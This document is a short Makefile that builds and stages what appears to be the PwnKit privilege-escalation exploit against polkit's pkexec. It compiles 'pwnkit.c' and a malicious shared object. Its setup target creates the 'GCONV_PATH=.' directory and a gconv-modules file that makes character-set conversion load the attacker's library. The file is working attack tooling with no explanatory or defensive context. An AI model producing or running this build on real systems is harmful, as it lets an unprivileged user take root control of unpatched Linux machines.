# Variable for the compiler
CC = gcc

.PHONY: all
all: setup exploit.so pwnkit

pwnkit: pwnkit.c
	@echo "[+] Compiling pwnkit.c ..."
	@$(CC) $^ -o $@
	@echo "[+] Done!"

exploit.so: exploit.c
	@echo "[+] Compiling exploit shared object ..."
	@$(CC) $^ -o pwn/$@ -fPIC -shared

.PHONY: setup
setup:
	@echo "[+] Setting up everything ..."
	@mkdir GCONV_PATH=.
	@touch GCONV_PATH=.\/pwn
	@chmod +x GCONV_PATH=.\/pwn
	@mkdir pwn
	@echo "module    UTF-8//    UTF-16//    exploit    1" > pwn/gconv-modules

.PHONY: clean
clean:
	@echo "[+] Removing the executables..."	
	@rm -rf GCONV_PATH=. pwn pwnkit
	@echo "[+] Done!"
